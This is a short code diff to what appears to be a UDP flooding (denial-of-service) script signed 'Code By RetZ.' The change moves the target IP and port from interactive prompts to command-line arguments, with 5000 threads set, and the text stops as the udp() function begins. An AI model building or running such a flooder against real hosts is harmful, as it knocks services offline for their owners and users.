@@ -1,15 +1,15 @@
 import random
 import socket
 import threading
-import os
+import os, sys
 
 os.system("clear")
 print('''\033[1;31;40m
 Code By RetZ.
 ''')
 
-ip = str(input("\033[93mIp Target: "))
-port = int(input("\033[93mPort Target: "))
+ip = str(sys.argv[1])
+port = int(sys.argv[2])
 times = int("1000")
 threads = int("5000")
 def udp():
